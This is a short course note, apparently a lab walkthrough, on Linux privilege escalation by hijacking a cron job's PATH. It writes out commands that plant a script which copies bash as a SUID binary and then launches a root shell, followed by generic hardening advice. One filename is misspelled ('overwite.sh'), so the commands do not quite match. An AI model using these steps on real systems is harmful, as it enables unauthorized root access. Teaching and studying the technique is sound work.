# 🛡️ Cron Paths

> **Course Track:** [Linux Privilege Escalation](../../README.md)  
> **Module:** [Scheduled tasks](./README.md)  
> **Topic Path:** `Linux Privilege Escalation > Scheduled tasks > Cron Paths`

---

## 🎯 Technical Overview & Objectives
This section covers the methodology, enumeration techniques, exploit mechanics, and defensive mitigations for **Cron Paths**.

---

## 🔬 Practical Notes, Commands & Proof of Exploit

In the machine 

When we type 

```bash
cat /etc/crontab
```
We see all the listed cronjobs 

In the machine, we saw that the path at which it checks starts with /home/user:
and there is a [overwrite.sh](http://overwrite.sh/) file that is running every min


![Privilege Escalation Proof Screenshot](./assets/024_Cron_Paths_1d6d64c5-e0cb-80c5-9c22-d94bc2eca2ce.png)
*Figure: Privilege Escalation Proof Screenshot*


When we check the /home/user we did not see any overwrite.sh
So well we make one that lets us escalate our privilages

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwite.sh
```
We use chmod to give it permission to execute

```bash
chmod +x /home/user/overwrite.sh
```


![Privilege Escalation Proof Screenshot](./assets/025_Cron_Paths_1d6d64c5-e0cb-8010-bd34-f9b6d4b2ed6e.png)
*Figure: Privilege Escalation Proof Screenshot*


We now wait for a min for the file to get overwritten
We can use ls -la to check when the file was overwritten

Then once it is overwritten, we type

```bash
/tmp/bash -p
```
And we are root



---

## 🛡️ Defensive Hardening & Remediation
- **Audit & Restrict Permissions:** Review `/etc/sudoers`, remove unnecessary SUID/SGID flags (`chmod u-s`), and enforce strict file ownership on configuration files.
- **Kernel Patching:** Regularly apply distribution security updates to mitigate known local privilege escalation (LPE) vulnerabilities.
- **Principle of Least Privilege:** Avoid running non-administrative daemon processes as `root` and isolate services using containers/namespaces.

---
[⬅ Back to Scheduled tasks](./README.md) • [🏠 Master Course Index](../README.md)
